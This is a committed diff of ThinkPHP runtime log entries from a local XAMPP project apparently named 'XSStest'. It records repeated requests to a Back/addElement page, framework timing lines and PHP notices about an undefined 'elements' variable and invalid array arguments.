+INFO: [ view_filter ] --END-- [ RunTime:0.000164s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000462s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000498s ]
+
+[ 2016-05-03T12:59:23+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000343s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000527s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000573s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000040s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000091s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004548s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004605s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000105s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000128s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000423s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000460s ]
+
+[ 2016-05-03T13:01:32+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000402s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000424s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000467s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000063s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000151s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007881s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.007944s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000142s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000173s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000550s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000598s ]
+
+[ 2016-05-03T13:01:38+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000329s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000413s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000456s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000047s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000108s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.006089s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.006183s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000133s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000162s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000776s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000840s ]
+
+[ 2016-05-03T13:01:39+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000432s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000289s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000323s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 39 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000076s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000224s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.005500s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.005536s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000136s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000165s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000352s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000389s ]
+
+[ 2016-05-03T13:01:40+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000210s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000258s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000288s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 39 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000042s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000102s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003612s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003641s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000114s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000139s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000371s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000419s ]
+
+[ 2016-05-03T13:06:29+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000631s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000879s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000968s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 36 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000051s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000118s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010033s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.010093s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000139s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000170s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000571s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000618s ]
+
+[ 2016-05-03T13:06:34+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000207s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000259s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000290s ]
+NOTIC: [2] array_push() expects parameter 1 to be array, null given /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 33 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000023s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000056s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003192s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003218s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000095s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000546s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000606s ]
+
+[ 2016-05-03T13:06:35+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000209s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000259s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000289s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 36 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000023s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000055s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003545s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003610s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000130s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000157s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000317s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000342s ]
+
+[ 2016-05-03T13:07:39+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000281s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000275s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000307s ]
+
+[ 2016-05-03T13:08:01+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000262s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000294s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000032s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000084s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.005320s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.005358s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000106s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000131s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000296s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000322s ]
+
+[ 2016-05-03T13:08:06+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000209s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000265s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000296s ]
+NOTIC: [2] array_push() expects parameter 1 to be array, null given /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 34 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000022s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000054s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003098s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003123s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000106s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000129s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000306s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000332s ]
+
+[ 2016-05-03T13:08:08+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000213s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000324s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000356s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000038s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000101s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.006604s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.006635s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000136s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000167s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000383s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000418s ]
+
+[ 2016-05-03T13:08:08+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000208s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000257s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000288s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000026s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000070s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004691s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004718s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000104s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000127s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000294s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000319s ]
+
+[ 2016-05-03T13:08:09+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000516s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000570s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000028s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000077s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004516s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004549s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000113s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000137s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000314s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000341s ]
+
+[ 2016-05-03T13:08:09+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000464s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000448s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000491s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000024s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000061s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003514s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003541s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000100s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000123s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000289s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000315s ]
+
+[ 2016-05-03T13:08:09+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000210s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000262s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000293s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000027s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000069s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004376s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004413s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000106s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000131s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000446s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000491s ]
+
+[ 2016-05-03T13:09:33+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000033s ]
+INFO: [ app_init ] --END-- [ RunTime:0.004040s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001762s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001849s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000040s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000105s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.015055s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.015104s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001704s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001757s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.005065s ]
+INFO: [ app_end ] --END-- [ RunTime:0.005145s ]
+
+[ 2016-05-03T13:09:38+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000474s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000485s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000555s ]
+NOTIC: [2] array_push() expects parameter 1 to be array, null given /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 34 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000026s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000069s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003620s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003659s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000104s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000128s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000294s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000319s ]
+
+[ 2016-05-03T13:09:38+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000207s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000258s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000288s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000024s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000063s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003395s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003422s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000102s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000125s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000471s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000512s ]
+
+[ 2016-05-03T13:09:39+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000237s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000273s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000304s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000027s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000071s ]
